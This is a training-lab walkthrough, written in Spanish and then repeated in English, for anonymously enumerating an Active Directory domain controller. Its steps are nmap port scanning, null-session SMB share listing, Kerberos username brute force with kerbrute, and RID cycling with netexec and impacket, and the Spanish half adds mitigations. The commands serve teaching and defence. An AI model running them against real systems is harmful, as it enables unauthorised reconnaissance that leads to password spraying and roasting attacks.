Objetivo

El Domain Controller acepta sesiones nulas y tiene la cuenta Guest habilitada: puedes listar recursos y enumerar usuarios sin credenciales. El recurso //DC01/public es legible de forma anónima y contiene la flag, además de las credenciales de servicio que necesitarás en el resto de laboratorios.

1 · Reconocimiento del Domain Controller

Los puertos delatan un DC: Kerberos (88), LDAP (389/636), Global Catalog (3268) y SMB (445).

nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}

# El nombre del dominio también sale por SMB
nxc smb {{ ad_dc_ip }}
# SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})

2 · Sesión nula: listar recursos compartidos

El servidor tiene restrict anonymous = 0, así que una sesión totalmente anónima (usuario y contraseña en blanco) lista los recursos. Importante: tiene que ser el usuario vacío — si indicas explícitamente guest como usuario, Samba intenta autenticar esa cuenta de verdad (no la trata como "bad user") y la sesión falla con STATUS_LOGON_FAILURE, aunque map to guest = Bad User sí mapee a invitado cualquier usuario que no exista.

# Con netexec (usuario y contraseña vacíos — no "guest" explícito)
nxc smb {{ ad_dc_ip }} -u '' -p '' --shares

# Con smbclient
smbclient -N -L //{{ ad_dc_ip }}/

# Con smbmap
smbmap -H {{ ad_dc_ip }} -u '' -p ''

Entre los recursos aparece public con permiso de lectura para todos.

3 · Enumerar usuarios del dominio sin credenciales

La vía verificada y funcional contra este Domain Controller es la fuerza bruta de nombres directamente contra el KDC de Kerberos: para cada nombre probado, el KDC responde distinto según exista o no esa cuenta (PRINCIPAL UNKNOWN vs. petición de pre-auth), y esto no requiere ninguna sesión SMB previa.

# Enumeración de usuarios contra Kerberos (no necesita sesión SMB ni credenciales)
kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt

Guarda la lista de usuarios válidos en users.txt: la vas a reutilizar en los labs de spraying, AS-REP Roasting y Kerberoasting.

kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt 2>/dev/null \
  | grep 'VALID USERNAME' | awk '{print $NF}' | cut -d@ -f1 > users.txt
cat users.txt

Nota sobre este Domain Controller: el RID cycling clásico por SMB/SAMR-LSAD (nxc --rid-brute, impacket-lookupsid) es la técnica que usarías contra un Domain Controller Windows real, pero no funciona contra este DC: la cuenta guest no admite login explícito (STATUS_LOGON_FAILURE) y, aunque uses una sesión completamente anónima, el propio LSAD rechaza la petición (STATUS_ACCESS_DENIED) — limitación conocida de la implementación de Samba. Los comandos reales, para referencia:

# Contra un DC Windows real esto SÍ funciona con sesión nula o guest:
nxc smb {{ ad_dc_ip }} -u '' -p '' --rid-brute
impacket-lookupsid '{{ ad_domain }}/:@{{ ad_dc_ip }}' 1500

Mitigación

  • Deshabilitar el acceso anónimo: RestrictAnonymous = 1 y deshabilitar la cuenta Guest.
  • Nunca publicar credenciales en recursos compartidos; usar gMSA o un gestor de secretos.
  • Restringir el listado de recursos y auditar los accesos anónimos (evento 5140).

1 · Domain Controller recon

The open ports give the DC away: Kerberos (88), LDAP (389/636), Global Catalog (3268) and SMB (445).

nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268 {{ ad_dc_ip }}

# SMB also leaks the domain name
nxc smb {{ ad_dc_ip }}
# SMB  {{ ad_dc_ip }}  445  {{ ad_dc_host }}  [*] Windows ... (name:{{ ad_dc_host }}) (domain:{{ ad_realm_lower }})

2 · Null session: list the shares

The server ships restrict anonymous = 0, so a fully anonymous session (blank username and password) lists the shares. Important: it must be the blank user — if you explicitly pass guest as the username, Samba actually tries to authenticate that account instead of treating it as a "bad user", and the session fails with STATUS_LOGON_FAILURE, even though map to guest = Bad User does map any nonexistent username to guest.

# With netexec (blank username/password — not an explicit "guest")
nxc smb {{ ad_dc_ip }} -u '' -p '' --shares

# With smbclient
smbclient -N -L //{{ ad_dc_ip }}/

# With smbmap
smbmap -H {{ ad_dc_ip }} -u '' -p ''

A public share shows up, readable by everyone.

3 · Enumerate domain users without credentials

The verified path that actually works against this Domain Controller is username brute force directly against the Kerberos KDC: for each candidate name, the KDC replies differently depending on whether the account exists (PRINCIPAL UNKNOWN vs. a pre-auth prompt), and this needs no prior SMB session at all.

# Kerberos user enumeration (no SMB session or credentials needed)
kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt

Save the valid usernames to users.txt: you will reuse it in the spraying, AS-REP Roasting and Kerberoasting labs.

kerbrute userenum -d {{ ad_realm_lower }} --dc {{ ad_dc_ip }} /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt 2>/dev/null \
  | grep 'VALID USERNAME' | awk '{print $NF}' | cut -d@ -f1 > users.txt
cat users.txt

Note about this Domain Controller: classic SMB/SAMR-LSAD RID cycling (nxc --rid-brute, impacket-lookupsid) is the technique you'd use against a real Windows Domain Controller, but it does not work against this DC: the guest account rejects explicit login (STATUS_LOGON_FAILURE), and even with a fully anonymous session LSAD itself denies the request (STATUS_ACCESS_DENIED) — a known limitation of Samba's implementation. The real commands, for reference:

# Against a real Windows DC this DOES work with a null or guest session:
nxc smb {{ ad_dc_ip }} -u '' -p '' --rid-brute
impacket-lookupsid '{{ ad_domain }}/:@{{ ad_dc_ip }}' 1500
